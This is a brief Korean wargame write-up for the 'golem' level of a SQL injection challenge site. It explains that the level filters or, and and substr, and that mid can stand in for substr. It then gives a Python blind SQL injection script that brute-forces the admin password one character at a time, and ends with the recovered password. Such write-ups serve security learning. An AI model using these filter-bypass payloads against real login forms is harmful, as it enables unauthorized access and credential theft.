# golem

or, and, substr을 필터링 하고 있다.   
<br/>

* substr 대신 mid를 사용할 수 있다.   
<br/>


```
import requests

headers = {'Cookie': 'PHPSESSID=ngcsj1fig1pjap0g93vqgh6rpm'}
url = 'https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?'

string = '0123456789abcdefghijklmnopqrstuvwxyz'

pw= ''
for i in range(1, 9):
	for j in string:
		url = 'https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?'
		value = "pw=aa' || id like 'admin' %26%26 mid(pw,"+ str(i) +",1) like '"+ j +"'%23"
		url += value
		response = requests.get(url, headers=headers)
		print j
		if "<h2>Hello admin</h2>" in response.text:
			pw += j
			print '[+] find : ' + pw
			break

print '[*] Password : ' + pw
```   
```
?pw=77d6290b
```
